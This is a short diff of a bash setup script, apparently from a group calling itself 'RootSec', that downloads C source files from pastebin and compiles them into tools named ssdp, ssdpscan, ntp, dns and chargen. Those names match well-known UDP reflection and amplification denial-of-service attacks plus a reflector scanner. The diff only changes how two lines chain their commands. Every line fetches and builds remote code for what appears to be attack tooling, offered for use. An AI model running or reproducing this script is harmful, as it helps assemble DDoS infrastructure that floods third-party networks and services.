@@ -1,7 +1,7 @@
 #!/bin/bash
 #   This script is setup all methods :p please install gcc RootSec
-wget -q http://pastebin.com/raw/vpbXuKVA -O ssdp.c; gcc -o ssdp ssdp.c -pthread
-wget -q http://pastebin.com/raw/7uNYKs4c -O ssdpscan.c; gcc -o ssdpscan ssdpscan.c -pthread
+wget -q http://pastebin.com/raw/vpbXuKVA -O ssdp.c && gcc -o ssdp ssdp.c -pthread
+wget -q http://pastebin.com/raw/7uNYKs4c -O ssdpscan.c && gcc -o ssdpscan ssdpscan.c -pthread
 wget -q http://pastebin.com/raw/PJeYk4Bc -O ntp.c; gcc -o ntp ntp.c -pthread
 wget -q http://pastebin.com/raw/JV9nCf6U -O dns.c; gcc -o dns dns.c -pthread
 wget -q http://pastebin.com/raw/Kktvq2pz -O chargen.c; gcc -o chargen chargen.c -pthread
